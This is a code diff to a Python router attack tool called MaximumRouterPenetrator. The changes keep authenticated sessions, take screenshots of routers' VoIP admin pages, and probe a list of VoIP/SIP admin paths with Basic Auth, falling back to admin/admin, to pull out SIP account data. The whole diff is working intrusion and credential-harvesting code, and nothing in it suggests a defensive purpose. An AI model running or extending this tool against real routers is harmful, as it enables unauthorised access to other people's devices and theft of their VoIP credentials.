@@ -1057,6 +1057,12 @@ class MaximumRouterPenetrator:
                     if verbose:
                         print(f"         ❌ LIVE DEBUG: Session creation failed: {str(e)[:50]}")
             
+            # Ensure session is available for subsequent operations
+            if auth_result.get('session'):
+                result['session'] = auth_result['session']
+                if verbose:
+                    print(f"         ✅ LIVE DEBUG: Session available for SIP and config extraction")
+            
             # Take screenshot of admin panel
             if self.screenshot_mode:
                 try:
@@ -1082,6 +1088,19 @@ class MaximumRouterPenetrator:
                             auth_result.get('credentials', ('admin', 'admin')),
                             verbose
                         )
+                    
+                    # Take VoIP page screenshot
+                    if screenshot_result['success']:
+                        voip_screenshot = self._take_screenshot_urllib(
+                            target_ip, 
+                            f"voip_page_{target_ip}.png",
+                            auth_result.get('credentials', ('admin', 'admin')),
+                            verbose
+                        )
+                        if voip_screenshot['success']:
+                            result['voip_screenshot'] = voip_screenshot['filename']
+                            if verbose:
+                                print(f"         ✅ VoIP page screenshot saved: {voip_screenshot['filename']}")
                     
                     if screenshot_result['success']:
                         result['admin_screenshot'] = screenshot_result['filename']
@@ -1153,7 +1172,12 @@ class MaximumRouterPenetrator:
             if verbose:
                 print(f"         📞 LIVE DEBUG: Searching for VoIP/SIP in admin panel...")
             
-            sip_result = self._extract_sip_from_admin_panel(target_ip, auth_result, verbose)
+            # Use session if available, otherwise use urllib
+            if auth_result.get('session'):
+                sip_result = self._extract_sip_from_admin_panel(target_ip, auth_result, verbose)
+            else:
+                sip_result = self._extract_sip_from_admin_panel_urllib(target_ip, auth_result, verbose)
+            
             if sip_result['success']:
                 result['sip_from_admin'] = sip_result['sip_data']
                 if verbose:
@@ -3503,6 +3527,71 @@ class MaximumRouterPenetrator:
         try:
             if verbose:
                 print(f"         🔍 LIVE DEBUG: Searching admin panel for VoIP/SIP...")
+            
+            # Common VoIP/SIP admin panel paths
+            voip_paths = [
+                '/admin/voip.asp', '/admin/voice.asp', '/admin/sip.asp',
+                '/voip.html', '/voice.html', '/sip.html',
+                '/admin/voip_config.asp', '/admin/voice_config.asp',
+                '/admin/voip_settings.asp', '/admin/voice_settings.asp',
+                '/admin/voip_accounts.asp', '/admin/voice_accounts.asp',
+                '/admin/voip_status.asp', '/admin/voice_status.asp',
+                '/admin/voip_log.asp', '/admin/voice_log.asp',
+                '/admin/voip_advanced.asp', '/admin/voice_advanced.asp'
+            ]
+            
+            base_url = f"http://{ip}"
+            credentials = auth_result.get('credentials', ('admin', 'admin'))
+            
+            # Use urllib with Basic Auth
+            import base64
+            auth_string = f'{credentials[0]}:{credentials[1]}'
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            for voip_path in voip_paths:
+                try:
+                    req = urllib.request.Request(f"{base_url}{voip_path}")
+                    req.add_header('Authorization', f'Basic {auth_b64}')
+                    
+                    response = urllib.request.urlopen(req, timeout=self.performance_config['timeouts']['connection'])
+                    content = response.read().decode('utf-8', errors='ignore')
+                    
+                    if response.getcode() == 200 and len(content) > 100:
+                        # Extract SIP data from page content
+                        sip_data = self._extract_sip_from_page_content(content)
+                        if sip_data:
+                            sip_result['sip_data'].extend(sip_data)
+                            if verbose:
+                                print(f"         📞 SIP data found in {voip_path}: {len(sip_data)} accounts")
+                        
+                        if verbose:
+                            print(f"         ✅ VoIP page found: {voip_path} ({len(content)} bytes)")
+                
+                except Exception:
+                    continue
+            
+            if sip_result['sip_data']:
+                sip_result['success'] = True
+                if verbose:
+                    print(f"         ✅ Total SIP accounts from admin panel: {len(sip_result['sip_data'])}")
+            
+        except Exception as e:
+            if verbose:
+                print(f"         ❌ Admin panel SIP extraction error: {str(e)[:50]}")
+        
+        return sip_result
+    
+    def _extract_sip_from_admin_panel_urllib(self, ip: str, auth_result: Dict, verbose: bool) -> Dict[str, Any]:
+        """Extract SIP data from admin panel pages using urllib"""
+        sip_result = {
+            'success': False,
+            'sip_data': []
+        }
+        
+        try:
+            if verbose:
+                print(f"         🔍 LIVE DEBUG: Searching admin panel for VoIP/SIP (urllib)...")
             
             # Common VoIP/SIP admin panel paths
             voip_paths = [
